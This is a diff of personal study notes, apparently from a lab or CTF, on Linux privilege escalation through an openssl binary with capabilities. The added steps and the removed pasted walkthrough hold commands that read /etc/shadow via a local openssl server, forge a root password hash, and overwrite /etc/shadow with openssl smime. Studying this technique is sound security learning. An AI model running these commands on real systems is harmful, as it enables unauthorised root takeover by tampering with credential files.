@@ -100,29 +100,9 @@ Come here again when you fully understood it and give a good summary in own word
 3. Depending on where you are when you have the capability of ep set on openssl it will inherit the permission from the location. -> We start the server with openssl in the / directory.
 That means if you start the server from a low privileged userdirectory you will inherit that permission but if you create it in the / directory the server will inherit root permission.
 4. We can access this server with wget or curl from our normal user. -> We can do something like: curl -k "https://127.0.0.1:1337/etc/shadow"
+5. Now that we have a copy of the /etc/shadow file we can create our own password hash with openssl and with that we can replace the hash for the root user in the file. -> openssl passwd -6 -salt xyz  yourpass
+6. Now we want to overwrite the orginial /etc/shadow file to do that we have to encrypt our new shadowfile otherwise we can't transport it over openssl.
+7. Now we can overwrite the original file. -> /openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/privkey.pem -out /etc/shadow
+8. We can switch User to root now since we created the new password!
 
-To be improved:
-5. If we want to write instead of read we could create a new file in a folder decrypt it with openssl 
 
-I will copy paste now:
-We use -k to ignore ssl errors. Nice, we can now read any root or system files. Now time to write a new shadow file and profit.
-Day 40: Privilege Escalation (Linux) by Modifying Shadow File for the Easy Win
-Scenario
-medium.com
-First let’s encrypt our new shadow file so we can use openssl to write via decrypt method.
-
-[user@box ~]$ openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
-
-Now it’s time to write the new shadow file
-
-[user@box ~]$ cd /
-[user@box /]$ /home/ldapuser1/openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/privkey.pem -out /etc/shadow
-Enter pass phrase for /tmp/privkey.pem:
-[user@box /]$ IT WORKED!
-
-Finally, lets su to root
-
-[user@box /]$ su root
-Password: 
-[root@box /]# id
-uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
